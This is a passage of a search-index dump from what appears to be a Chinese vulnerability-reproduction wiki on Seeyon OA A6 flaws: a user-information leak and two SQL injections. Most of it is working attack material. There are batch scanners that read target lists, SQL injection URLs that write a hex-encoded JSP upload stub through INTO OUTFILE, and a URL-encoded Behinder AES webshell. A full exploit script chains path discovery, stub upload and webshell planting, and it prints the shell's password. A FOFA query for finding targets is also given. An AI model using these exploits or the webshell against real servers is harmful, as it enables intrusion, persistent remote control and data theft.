Seeyon_OA_A6_initDataAssess.jsp_User_information_leakage","title":"\u81f4\u8fdcOA A6 initDataAssess.jsp \u7528\u6237\u654f\u611f\u4fe1\u606f\u6cc4\u9732"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20initDataAssess.jsp%20%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u81f4\u8fdcoa-a6-initdataassessjsp-\u7528\u6237\u654f\u611f\u4fe1\u606f\u6cc4\u9732","text":"","title":"\u81f4\u8fdcOA A6 initDataAssess.jsp \u7528\u6237\u654f\u611f\u4fe1\u606f\u6cc4\u9732"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20initDataAssess.jsp%20%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u81f4\u8fdcOA A6 initDataAssess.jsp \u5b58\u5728\u7528\u6237\u654f\u611f\u4fe1\u606f\u6cc4\u9732 \u53ef\u4ee5\u901a\u8fc7\u5f97\u5230\u7684\u7528\u6237\u540d\u7206\u7834\u7528\u6237\u5bc6\u7801\u8fdb\u5165\u540e\u53f0\u8fdb\u4e00\u6b65\u653b\u51fb","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20initDataAssess.jsp%20%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u81f4\u8fdcOA A6","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20initDataAssess.jsp%20%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#fofa","text":"[!NOTE] title=\"\u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6.A6\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20initDataAssess.jsp%20%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95ee\u4e0b\u5217URL\u6cc4\u9732\u7528\u6237\u4fe1\u606f http://xxx.xxx.xxx.xxx/yyoa/assess/js/initDataAssess.jsp","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20initDataAssess.jsp%20%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#\u6f0f\u6d1e\u5229\u7528poc","text":"import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA A6 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mFile >>> ip.txt \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/yyoa/assess/js/initDataAssess.jsp\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if \"/yyoa/index.jsp\" not in response . text and \"personList\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e,\u6cc4\u9732\u5730\u5740: {} \\033 [0m\" . format ( target_url , vuln_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" ) def Scan ( file_name ): with open ( file_name , \"r\" , encoding = 'utf8' ) as scan_url : for url in scan_url : if url [: 4 ] != \"http\" : url = \"http://\" + url url = url . strip ( ' \\n ' ) try : POC_1 ( url ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u62a5\u9519 \\033 [0m\" ) continue if __name__ == '__main__' : title () file_name = str ( input ( \" \\033 [35mPlease input Attack File \\n File >>> \\033 [0m\" )) Scan ( file_name )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20initDataAssess.jsp%20%E7%94%A8%E6%88%B7%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Seeyon_OA_A6_initDataAssess.jsp_User_information_leakage","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20setextno.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u81f4\u8fdcOA A6 setextno.jsp \u5b58\u5728sql\u6ce8\u5165\u6f0f\u6d1e\uff0c\u5e76\u53ef\u4ee5\u901a\u8fc7\u6ce8\u5165\u5199\u5165webshell\u6587\u4ef6\u63a7\u5236\u670d\u52a1\u5668 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u81f4\u8fdcOA A6 FOFA \u00b6 [!NOTE] title=\"\u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6.A6\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95ee\u5982\u4e0bUrl\uff0c\u5176\u4e2d\u542b\u6709 union\u6ce8\u5165 http://xxx.xxx.xxx.xxx/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(1)),4# \u67e5\u770bweb\u8def\u5f84 \u5199\u5165\u6587\u4ef6\u4e0a\u4f20\u6728\u9a6c http://xxx.xxx.xxx/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(select unhex('3C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E') into outfile 'D:/Program Files/UFseeyon/OA/tomcat/webapps/yyoa/peiqi_upload.jsp'),4# \u5269\u4e0b\u7684\u6b65\u9aa4\u53c2\u8003\u53e6\u4e00\u7bc7 \u81f4\u8fdcOA A6 test.jsp SQL\u6ce8\u5165\u6f0f\u6d1e \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] \u591a\u4e2a\u76ee\u6807 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA A6 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mFile >>> ip.txt \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(1)),4#\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if response . status_code == 200 and \"c4ca4238a0b923820dcc509a6f75849b\" in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url , vuln_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url )) def Scan ( file_name ): with open ( file_name , \"r\" , encoding = 'utf8' ) as scan_url : for url in scan_url : if url [: 4 ] != \"http\" : url = \"http://\" + url url = url . strip ( ' \\n ' ) try : POC_1 ( url ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u62a5\u9519 \\033 [0m\" . format ( e )) continue if __name__ == '__main__' : title () file_name = str ( input ( \" \\033 [35mPlease input Attack File \\n File >>> \\033 [0m\" )) Scan ( file_name ) Goby & POC \u00b6 [!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Seeyon_OA_A6_setextno.jsp_SQL_injection","title":"\u81f4\u8fdcOA A6 setextno.jsp SQL\u6ce8\u5165\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20setextno.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#_1","text":"","title":""},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20setextno.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"\u81f4\u8fdcOA A6 setextno.jsp \u5b58\u5728sql\u6ce8\u5165\u6f0f\u6d1e\uff0c\u5e76\u53ef\u4ee5\u901a\u8fc7\u6ce8\u5165\u5199\u5165webshell\u6587\u4ef6\u63a7\u5236\u670d\u52a1\u5668","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20setextno.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] \u81f4\u8fdcOA A6","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20setextno.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] title=\"\u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6.A6\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20setextno.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8bbf\u95ee\u5982\u4e0bUrl\uff0c\u5176\u4e2d\u542b\u6709 union\u6ce8\u5165 http://xxx.xxx.xxx.xxx/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(1)),4# \u67e5\u770bweb\u8def\u5f84 \u5199\u5165\u6587\u4ef6\u4e0a\u4f20\u6728\u9a6c http://xxx.xxx.xxx/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(select unhex('3C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E') into outfile 'D:/Program Files/UFseeyon/OA/tomcat/webapps/yyoa/peiqi_upload.jsp'),4# \u5269\u4e0b\u7684\u6b65\u9aa4\u53c2\u8003\u53e6\u4e00\u7bc7 \u81f4\u8fdcOA A6 test.jsp SQL\u6ce8\u5165\u6f0f\u6d1e","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20setextno.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5229\u7528poc","text":"[!NOTE] \u591a\u4e2a\u76ee\u6807 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA A6 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mFile >>> ip.txt \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/yyoa/ext/trafaxserver/ExtnoManage/setextno.jsp?user_ids=(99999) union all select 1,2,(md5(1)),4#\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , headers = headers , verify = False , timeout = 5 ) if response . status_code == 200 and \"c4ca4238a0b923820dcc509a6f75849b\" in response . text : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url , vuln_url )) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url )) def Scan ( file_name ): with open ( file_name , \"r\" , encoding = 'utf8' ) as scan_url : for url in scan_url : if url [: 4 ] != \"http\" : url = \"http://\" + url url = url . strip ( ' \\n ' ) try : POC_1 ( url ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u62a5\u9519 \\033 [0m\" . format ( e )) continue if __name__ == '__main__' : title () file_name = str ( input ( \" \\033 [35mPlease input Attack File \\n File >>> \\033 [0m\" )) Scan ( file_name )","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20setextno.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Seeyon_OA_A6_setextno.jsp_SQL_injection","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E8%87%B4%E8%BF%9COA/%E8%87%B4%E8%BF%9COA%20A6%20test.jsp%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/","text":"\u81f4\u8fdcOA A6 test.jsp SQL\u6ce8\u5165\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 \u81f4\u8fdcOA A6 test.jsp \u5b58\u5728sql\u6ce8\u5165\u6f0f\u6d1e\uff0c\u5e76\u53ef\u4ee5\u901a\u8fc7\u6ce8\u5165\u5199\u5165webshell\u6587\u4ef6\u63a7\u5236\u670d\u52a1\u5668 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] \u81f4\u8fdcOA A6 FOFA \u00b6 [!NOTE] title=\"\u81f4\u8fdcA8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6.A6\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8bbf\u95eeURL http://xxx.xxx.xxx.xxx/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20database()) \u8fd4\u56de\u4e86\u5f53\u524d\u4f7f\u7528\u7684\u6570\u636e\u5e93 \u8981\u60f3\u5199\u5165shell\u9700\u8981\u77e5\u9053\u5199\u5165\u7684\u8def\u5f84 \u8fd9\u91cc\u5f97\u5230\u8def\u5f84 D:\\Program Files\\UFseeyon\\OA\\mysql\\bin..\\ \u901a\u8fc7 into outfile \u5199\u5165\u6587\u4ef6\uff0c\u8fd9\u91cc\u56e0\u4e3a jsp\u6728\u9a6c\u5b58\u5728\u7279\u6b8a\u7b26\u53f7\uff0c\u4f7f\u7528 hex\u7f16\u7801 \u4e0a\u4f20\u5141\u8bb8\u6587\u4ef6\u4e0a\u4f20\u7684jsp\u6587\u4ef6 <%i f ( request . getParameter ( \"f\" ) != null )( new java . io . FileOutputStream ( application . getRealPath ( \"\\\\\" ) + request . getParameter ( \"f\" ))). write ( request . getParameter ( \"t\" ). getBytes ()); %> HEX\u7f16\u7801 3C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C5C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E http://xxx.xxx.xxx.xxx/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20unhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27)%20%20into%20outfile%20%27E:/Program Files/UFseeyon/OA/tomcat/webapps/yyoa/peiqi_upload.jsp%27 \u663e\u793a\u4e0a\u56fe\u5219\u4e0a\u4f20\u6210\u529f\uff0c\u8bbf\u95ee peiqi_upload.jsp \u4e3a\u7a7a\u767d\u4e0d\u62a5\u9519\u9875\u9762\u4e0d\u5b58\u5728\u5c31\u662f\u4e0a\u4f20\u6210\u529f \u5728\u53d1\u9001\u8bf7\u6c42\u5305\u4e0a\u4f20webshell\uff0c\u8fd9\u91cc\u4e0a\u4f20\u51b0\u874e [!NOTE] \u6ce8\u610f\u4e0a\u4f20\u7684webshell\u9700\u8981url\u7f16\u7801\u4e00\u4e0b http://xxx.xxx.xxx.xxx/yyoa/peiqi_upload.jsp?f=peiqiwebshell.jsp t=%3C%25%40page%20import%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.*%22%25%3E%3C%25!class%20U%20extends%20ClassLoader%7BU(ClassLoader%20c)%7Bsuper(c)%3B%7Dpublic%20Class%20g(byte%20%5B%5Db)%7Breturn%20super.defineClass(b%2C0%2Cb.length)%3B%7D%7D%25%3E%3C%25if%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D%22e45e329feb5d925b%22%3Bsession.putValue(%22u%22%2Ck)%3BCipher%20c%3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new%20sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D%25%3E \u8fde\u63a5\u6728\u9a6c \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] EXP\u6728\u9a6c\u4e0a\u4f20 import requests import sys import random import re import base64 import time import json from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20@@basedir)\" try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , verify = False , timeout = 5 ) if '\u5e8f\u53f7' in response . text and \"@@basedir\" in response . text and response . status_code == 200 : OA_dir = re . findall ( r '>(.*) \\\\ UFseeyon \\\\ ' , response . text )[ 0 ] OA_dir = OA_dir [: 2 ] + '/' + OA_dir [ 3 :] print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e, \u5b89\u88c5\u8def\u5f84\u4e3a: {} \\033 [0m\" . format ( target_url , OA_dir )) webshell_name = \"peiqi_upload {} .jsp\" . format ( random . randint ( 1 , 999 )) OA_dir = OA_dir + \"/UFseeyon/OA/tomcat/webapps/yyoa/ {} \" . format ( webshell_name ) POC_2 ( target_url , OA_dir , webshell_name ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url ), e ) def POC_2 ( target_url , OA_dir , webshell_name ): vuln_url = target_url + \"/yyoa/common/js/menu/test.jsp?doType=101&S1=select %20u nhex(%273C25696628726571756573742E676574506172616D657465722822662229213D6E756C6C29286E6577206A6176612E696F2E46696C654F757470757453747265616D286170706C69636174696F6E2E6765745265616C5061746828225C22292B726571756573742E676574506172616D65746572282266222929292E777269746528726571756573742E676574506172616D6574657228227422292E67657442797465732829293B253E%27) %20% 20into %20o utfile %20% 27 {} %27\" . format ( OA_dir ) try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response = requests . get ( url = vuln_url , verify = False , timeout = 5 ) if 'already' in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u6587\u4ef6\u5199\u5165\u6728\u9a6c\u4e0a\u4f20\u5931\u8d25\uff0c\u76ee\u6807\u5df2\u5b58\u5728\u76f8\u540c\u6587\u4ef6\uff0c\u8bf7\u91cd\u65b0\u8fd0\u884c \\033 [0m\" ) elif \"No Data\" in response . text and response . status_code == 200 : print ( \" \\033 [32m[o] \u6587\u4ef6\u5199\u5165\u6728\u9a6c\u4e0a\u4f20\u6210\u529f\uff0c\u4e0a\u4f20\u8def\u5f84\u4e3a {} \\033 [0m\" . format ( OA_dir )) POC_3 ( target_url , webshell_name ) else : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u6728\u9a6c\u4e0a\u4f20\u5931\u8d25 \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url ), e ) def POC_3 ( target_url , webshell_name ): rebe_webshell = \"peiqiwebshell {} .jsp\" . format ( random . randint ( 1 , 999 )) vuln_url = target_url + \"/yyoa/ {} ?f= {} \" . format ( webshell_name , rebe_webshell ) data = \"t=%3C %25% 40page %20i mport%3D%22java.util.*%2Cjavax.crypto.*%2Cjavax.crypto.spec.* %22% 25 %3E %3C%25!class%20U %20e xtends%20ClassLoader%7BU(ClassLoader %20c )%7Bsuper(c)%3B%7Dpublic%20Class %20g (byte %20% 5B%5Db)%7Breturn %20s uper.defineClass(b%2C0%2Cb.length)%3B%7D%7D %25% 3E%3C %25i f%20(request.getMethod().equals(%22POST%22))%7BString%20k%3D %22e 45e329feb5d925b %22% 3Bsession.putValue( %22u%22% 2Ck)%3BCipher %20c %3DCipher.getInstance(%22AES%22)%3Bc.init(2%2Cnew%20SecretKeySpec(k.getBytes()%2C%22AES%22))%3Bnew%20U(this.getClass().getClassLoader()).g(c.doFinal(new %20s un.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3B%7D %25% 3E\" headers = { \"Content-Type\" : \"application/x-www-form-urlencoded\" } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42\uff1a {} \\033 [0m\" . format ( vuln_url )) response = requests . post ( url = vuln_url , data = data , headers = headers , verify = False , timeout = 5 ) if response . status_code == 200 : print ( \" \\033 [32m[o] \u6728\u9a6c\u4e0a\u4f20\u6210\u529f, \u8def\u5f84\u4e3a: {} /yyoa/ {} \\033 [0m\" . format ( target_url , rebe_webshell )) print ( \" \\033 [32m[o] \u8bf7\u4f7f\u7528\u51b0\u874e\u8fde\u63a5\uff0c\u5bc6\u7801\u4e3a: rebeyond \\033 [0m\" ) else : print ( \" \\033 [31m[x] \u6728\u9a6c\u4e0a\u4f20\u5931\u8d25\uff0c\u53ef\u80fd\u88ab\u62e6\u622a \\033 [0m\" . format ( target_url )) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" . format ( target_url ), e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url ) [!NOTE] \u591a\u4e2a\u76ee\u6807\u6d4b\u8bd5 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mVersion: \u81f4\u8fdcOA A6 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mFile >>> ip.txt \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url = target_url + \"/yyoa/common/js/menu/test.jsp?doType=101&S1=(SELECT%20md5(1))\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 